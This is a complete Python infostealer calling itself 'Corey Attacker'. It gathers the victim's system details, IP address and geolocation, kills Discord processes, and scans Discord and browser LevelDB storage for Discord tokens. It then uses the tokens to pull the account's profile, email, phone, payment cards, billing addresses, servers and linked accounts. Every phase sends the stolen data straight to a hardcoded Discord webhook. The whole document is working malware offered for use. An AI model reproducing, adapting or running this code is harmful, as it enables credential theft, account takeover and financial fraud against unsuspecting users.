
import os, re, json, platform, sqlite3, shutil, subprocess, time
import uuid, socket, requests, base64, struct, sys, glob
from pathlib import Path
from datetime import datetime

# ============================================================
# CONFIG — Replace with your Discord webhook
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1519239672050745366/LWIMSPenWLHN0g8EhIoxKbgVGU1eGzWJoY5xL_MugHL6fRyfJFeJRSX6Tbwfd9QcomKR"

# ============================================================
# UTILITY — Send immediately
# ============================================================
def send_now(embed):
    """Send data immediately, no waiting"""
    try:
        r = requests.post(WEBHOOK_URL, json={
            "embeds": [embed],
            "username": "Corey Attacker",
            "avatar_url": "https://cdn.discordapp.com/embed/avatars/4.png"
        }, timeout=10)
        return r.status_code in [200, 204]
    except:
        return False

def quick_embed(title, desc, color=0x5865F2, fields=None):
    return {
        "title": title,
        "description": desc,
        "color": color,
        "footer": {"text": f"Corey Attacker | {datetime.utcnow().isoformat()}"},
        "timestamp": datetime.utcnow().isoformat(),
        "fields": fields or []
    }

# ============================================================
# PHASE 1: System Info → Sent Immediately
# ============================================================
def phase1_system_info():
    info = {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "machine": platform.machine(),
        "local_ip": "unknown",
        "mac": "unknown",
        "public_ip": "unknown",
        "city": "unknown", "region": "unknown", "country": "unknown",
        "isp": "unknown", "lat": "?", "lon": "?"
    }
    
    # Local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except: pass
    
    # MAC
    try:
        mac = uuid.getnode()
        info["mac"] = ':'.join(['{:02x}'.format((mac >> e) & 0xff) for e in range(0, 2*6, 2)][::-1])
    except: pass
    
    # Public IP
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        info["public_ip"] = r.json().get("ip", "unknown")
    except: pass
    
    # Geo
    try:
        r = requests.get(f"https://ipapi.co/{info['public_ip']}/json/", timeout=5)
        geo = r.json()
        info.update({k: geo.get(k, "?") for k in ["city","region","country_name","org","latitude","longitude"]})
        info["country"] = info.pop("country_name", "?")
        info["isp"] = info.pop("org", "?")
        info["lat"] = info.pop("latitude", "?")
        info["lon"] = info.pop("longitude", "?")
    except: pass
    
    # Send phase 1 immediately
    fields = [
        {"name": "🌐 IP & Location", "value": 
         f"**Public:** {info['public_ip']}\n**Local:** {info['local_ip']}\n"
         f"**MAC:** {info['mac']}\n**ISP:** {info['isp']}\n"
         f"**City:** {info['city']}\n**Region:** {info['region']}\n"
         f"**Country:** {info['country']}\n**Coords:** {info['lat']}, {info['lon']}", "inline": True},
        {"name": "💻 System", "value":
         f"**Hostname:** {info['hostname']}\n**User:** {info['username']}\n"
         f"**OS:** {info['os']}\n**Machine:** {info['machine']}", "inline": True}
    ]
    
    send_now(quick_embed("📡 Phase 1: System Intelligence", "Initial recon complete", 0x5865F2, fields))
    print("[+] Phase 1 sent")
    return info

# ============================================================
# PHASE 2: Token Hunt → Sent Immediately
# ============================================================
def phase2_hunt_tokens():
    TOKEN_RE = re.compile(rb'[MN][A-Za-z0-9_-]{23,26}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,}')
    all_tokens = set()
    sources_found = []
    killed = []
    
    system = platform.system()
    home = str(Path.home())
    
    # 1. Kill Discord to unlock files
    procs = ["discord", "discordcanary", "discordptb", "discorddevelopment"]
    try:
        if system == "Darwin":
            out = subprocess.check_output(["ps", "aux"], timeout=5).decode().lower()
            for p in procs:
                if p in out:
                    subprocess.run(["pkill", "-f", p], capture_output=True, timeout=5)
                    killed.append(p)
        elif system == "Windows":
            out = subprocess.check_output("tasklist", shell=True).decode().lower()
            for p in procs:
                if p in out:
                    subprocess.run(["taskkill", "/F", "/IM", f"{p}.exe"], capture_output=True, timeout=5)
                    killed.append(p)
        elif system == "Linux":
            out = subprocess.check_output(["ps", "aux"], timeout=5).decode().lower()
            for p in procs:
                if p in out:
                    subprocess.run(["pkill", "-f", p], capture_output=True, timeout=5)
                    killed.append(p)
    except: pass
    
    if killed:
        time.sleep(1.5)
    
    # 2. All possible LevelDB paths
    ldb_paths = []
    
    if system == "Darwin":
        for client in procs:
            p = os.path.join(home, "Library", "Application Support", client, "Local Storage", "leveldb")
            if os.path.isdir(p): ldb_paths.append((p, f"Discord {client}"))
        
        browser_bases = [
            (os.path.join(home, "Library", "Application Support", "Google", "Chrome"), "Chrome"),
            (os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser"), "Brave"),
            (os.path.join(home, "Library", "Application Support", "Microsoft Edge"), "Edge"),
        ]
        for base, name in browser_bases:
            if os.path.isdir(base):
                for item in os.listdir(base):
                    p = os.path.join(base, item, "Local Storage", "leveldb")
                    if os.path.isdir(p): ldb_paths.append((p, f"{name} ({item})"))
    
    elif system == "Windows":
        appdata = os.getenv("APPDATA", "")
        localappdata = os.getenv("LOCALAPPDATA", "")
        for client in procs:
            p = os.path.join(appdata, client, "Local Storage", "leveldb")
            if os.path.isdir(p): ldb_paths.append((p, f"Discord {client}"))
        
        browser_bases = [
            (os.path.join(localappdata, "Google", "Chrome", "User Data"), "Chrome"),
            (os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"), "Brave"),
            (os.path.join(localappdata, "Microsoft", "Edge", "User Data"), "Edge"),
        ]
        for base, name in browser_bases:
            if os.path.isdir(base):
                for item in os.listdir(base):
                    p = os.path.join(base, item, "Local Storage", "leveldb")
                    if os.path.isdir(p): ldb_paths.append((p, f"{name} ({item})"))
    
    elif system == "Linux":
        for client in procs:
            p = os.path.join(home, ".config", client, "Local Storage", "leveldb")
            if os.path.isdir(p): ldb_paths.append((p, f"Discord {client}"))
        
        browser_bases = [
            (os.path.join(home, ".config", "google-chrome"), "Chrome"),
            (os.path.join(home, ".config", "brave"), "Brave"),
        ]
        for base, name in browser_bases:
            if os.path.isdir(base):
                for item in os.listdir(base):
                    p = os.path.join(base, item, "Local Storage", "leveldb")
                    if os.path.isdir(p): ldb_paths.append((p, f"{name} ({item})"))
    
    # 3. Scan each path
    for ldb_path, label in ldb_paths:
        try:
            for fname in os.listdir(ldb_path):
                if not (fname.endswith('.ldb') or fname.endswith('.log')):
                    continue
                fpath = os.path.join(ldb_path, fname)
                try:
                    with open(fpath, 'rb') as f:
                        data = f.read()
                    matches = TOKEN_RE.findall(data)
                    for m in matches:
                        try:
                            all_tokens.add(m.decode('utf-8'))
                        except: pass
                except: pass
        except: pass
    
    tokens = list(all_tokens)
    
    # Send phase 2 immediately
    status = f"**Paths scanned:** {len(ldb_paths)}\n**Tokens found:** {len(tokens)}\n**Killed processes:** {', '.join(killed) if killed else 'None'}"
    if tokens:
        status += f"\n\n**First token:** `{tokens[0][:50]}...`"
    
    send_now(quick_embed("🎯 Phase 2: Token Hunt", status, 0xED4245 if tokens else 0x5865F2))
    print(f"[+] Phase 2 sent — {len(tokens)} token(s)")
    
    return tokens, killed

# ============================================================
# PHASE 3: Validate & Send Profile
# ============================================================
def phase3_fetch_profile(token):
    if not token:
        return None
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code != 200:
            send_now(quick_embed("❌ Invalid Token", f"Token rejected with status {r.status_code}", 0xED4245))
            return None
        
        profile = r.json()
        
        # Send profile immediately
        nitro_map = {0: 'None', 1: 'Classic', 2: 'Nitro', 3: 'Basic'}
        profile_text = (
            f"**User:** {profile['username']}#{profile.get('discriminator', '0')}\n"
            f"**ID:** {profile['id']}\n"
            f"**Email:** {profile.get('email', 'hidden')}\n"
            f"**Phone:** {profile.get('phone', 'none')}\n"
            f"**MFA:** {'✅' if profile.get('mfa_enabled') else '❌'}\n"
            f"**Verified:** {profile.get('verified', False)}\n"
            f"**Nitro:** {nitro_map.get(profile.get('premium_type', 0), 'None')}\n"
            f"**Locale:** {profile.get('locale', '?')}\n"
            f"**Bio:** {(profile.get('bio') or 'N/A')[:200]}"
        )
        
        embed = quick_embed("👤 Phase 3: Discord Profile", f"Token is **VALID**", 0x57F287)
        embed["fields"] = [{"name": "🔑 Token", "value": f"`{token[:70]}...`", "inline": False},
                           {"name": "Profile", "value": profile_text, "inline": False}]
        
        send_now(embed)
        print(f"[+] Phase 3 sent — Profile for {profile['username']}")
        return profile
    except Exception as e:
        send_now(quick_embed("⚠️ Phase 3 Error", f"Could not fetch profile: {e}", 0xED4245))
        return None

# ============================================================
# PHASE 4: Billing & Cards → Sent Immediately
# ============================================================
def phase4_billing(token, profile):
    if not token or not profile:
        return
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    
    # Billing
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=10)
        if r.status_code == 200:
            billing = r.json()
            if billing and len(billing) > 0:
                lines = []
                for p in billing:
                    if p.get('type') == 1:
                        addr = p.get('billing_address', {})
                        lines.append(
                            f"💳 **{p.get('brand', 'Card')}** •••• {p.get('last4', '????')}\n"
                            f"Exp: {p.get('expires_month','??')}/{p.get('expires_year','??')}\n"
                            f"Name: {addr.get('name','N/A')}\n"
                            f"Addr: {addr.get('line1','')}, {addr.get('city','')}, {addr.get('state','')} {addr.get('postal_code','')}\n"
                            f"Country: {addr.get('country','')}\n"
                            f"Status: {'⚠️ INVALID' if p.get('invalid') else '✅ VALID'}"
                        )
                    elif p.get('type') == 2:
                        lines.append(f"💵 **PayPal** — {p.get('email', p.get('paypal_email', 'Linked'))}")
                
                send_now(quick_embed("💳 Phase 4: Payment Methods", 
                                    f"**{len(billing)} payment source(s) found**\n\n" + "\n\n".join(lines)[:2000],
                                    0x57F287))
                print(f"[+] Phase 4 sent — {len(billing)} payment(s)")
            else:
                send_now(quick_embed("💳 Phase 4: Payment Methods", "No payment sources linked.", 0x5865F2))
    except Exception as e:
        send_now(quick_embed("⚠️ Phase 4 Error", f"Could not fetch billing: {e}", 0xED4245))
    
    # Subscriptions
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=10)
        if r.status_code == 200:
            subs = r.json()
            if subs and len(subs) > 0:
                lines = [f"**{s.get('name','Sub')}** — {s.get('status','?')} | Renews: {s.get('current_period_end','?')}" for s in subs]
                send_now(quick_embed("📦 Subscriptions", "\n".join(lines)[:2000], 0x5865F2))
                print(f"[+] Subscriptions sent")
    except: pass

# ============================================================
# PHASE 5: Guilds & Connections
# ============================================================
def phase5_extra(token):
    if not token:
        return
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=10)
        if r.status_code == 200:
            guilds = r.json()
            if guilds:
                lines = [f"• {g.get('name','?')} (ID: {g.get('id','?')})" for g in guilds[:15]]
                if len(guilds) > 15:
                    lines.append(f"• ... and {len(guilds)-15} more")
                send_now(quick_embed("📋 Servers", f"**{len(guilds)} servers**\n" + "\n".join(lines)[:2000], 0x5865F2))
    except: pass
    
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/connections", headers=headers, timeout=10)
        if r.status_code == 200:
            conns = r.json()
            if conns:
                lines = [f"• {c.get('type','?')}: {c.get('name','?')}" for c in conns[:10]]
                send_now(quick_embed("🔗 Connected Accounts", "\n".join(lines)[:2000], 0x5865F2))
    except: pass

# ============================================================
# MAIN
# ============================================================
def main():
    print("""\033[96m
   ______                      __        __    _   __
  / ____/___  ____  _________ _/ /_      / /   (_) / /____  _____
 / /   / __ \/ __ \/ ___/ __ `/ __/_____/ /   / / / __/ _ \/ ___/
/ /___/ /_/ / / / (__  ) /_/ / /_/_____/ /___/ / / /_/  __/ /
\____/\____/_/ /_/____/\__,_/\__/     /_____/_/_\__/\___/_/
                                                         v2.1\033[0m""")
    print("[*] Corey Attacker — Instant Exfiltration Mode")
    print("[*] Each phase sends data immediately. Nothing is lost.\n")
    
    # Phase 1
    sys_info = phase1_system_info()
    
    # Phase 2
    tokens, killed = phase2_hunt_tokens()
    
    # Phase 3-5
    if tokens:
        profile = phase3_fetch_profile(tokens[0])
        if profile:
            phase4_billing(tokens[0], profile)
            phase5_extra(tokens[0])
    
    print("\n[✔] Corey Attacker complete. All data exfiltrated in real-time.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[-] Interrupted.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
